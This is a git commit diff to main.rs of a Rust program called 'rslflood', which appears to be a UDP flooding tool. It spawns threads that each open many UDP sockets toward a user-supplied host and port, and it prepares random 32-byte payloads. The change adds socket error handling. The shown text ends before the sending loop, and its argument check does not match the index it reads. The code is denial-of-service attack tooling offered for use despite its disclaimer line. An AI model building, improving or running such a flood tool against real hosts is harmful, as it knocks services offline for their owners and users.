716ddac9416ed4a389cc5fc3402883884e7fa35e
arehackerhaisala <168424766+arehackerhaisala@users.noreply.github.com>
2024-04-29 19:30:27 +0530

    Update main.rs

--- src/main.rs
+++ src/main.rs
@@ -1,15 +1,27 @@
 use std::env;
-use std::net::UdpSocket;
+use std::net::{UdpSocket, SocketAddr};
 use std::process::exit;
 use std::thread;
 use std::time;
 
 use rand::Rng;
 
-fn new_socket(host: &str, port: u32) -> UdpSocket {
-    let socket = UdpSocket::bind(format!("0.0.0.0:{}", port)).unwrap();
-    socket.connect(host).unwrap();
-    socket
+fn new_socket(host: &str, port: u32) -> Option<UdpSocket> {
+    match UdpSocket::bind(format!("0.0.0.0:{}", port)) {
+        Ok(socket) => {
+            match socket.connect(host) {
+                Ok(_) => Some(socket),
+                Err(e) => {
+                    println!("Error connecting: {}", e);
+                    None
+                }
+            }
+        }
+        Err(e) => {
+            println!("Error binding: {}", e);
+            None
+        }
+    }
 }
 
 fn log(msg: &str) {
@@ -20,7 +32,7 @@ fn main() {
     let args: Vec<_> = env::args().collect();
     log("rslflood - Made by Celesian");
     log("Don't use this tool for unauthorized purposes.");
-    
+
     if args.len() > 3 {
         log(&format!("Starting attack against {}...", args[1]));
 
@@ -28,18 +40,21 @@ fn main() {
         let time = args[3].parse::<u64>().unwrap();
         let host = args[1].to_string();
         let port = args[4].parse::<u32>().unwrap(); // User provided port
-        
+
         log("Starting threads...");
-        
+
         for thread_num in 1..=num_threads {
             let host = format!("{}:{}", host.clone(), port);
             thread::spawn(move || {
                 log(&format!("Starting simulated attack on thread {}...", thread_num));
                 let mut socket_list = Vec::new();
-                
+
                 for _ in 1..=20 {
-                    let socket = new_socket(host.as_str(), port);
-                    socket_list.push(socket);
+                    if let Some(socket) = new_socket(&host, port) {
+                        socket_list.push(socket);
+                    } else {
+                        return; // Exit the thread if unable to create socket
+                    }
                 }
 
                 let msg = rand::thread_rng().gen::<[u8; 32]>();
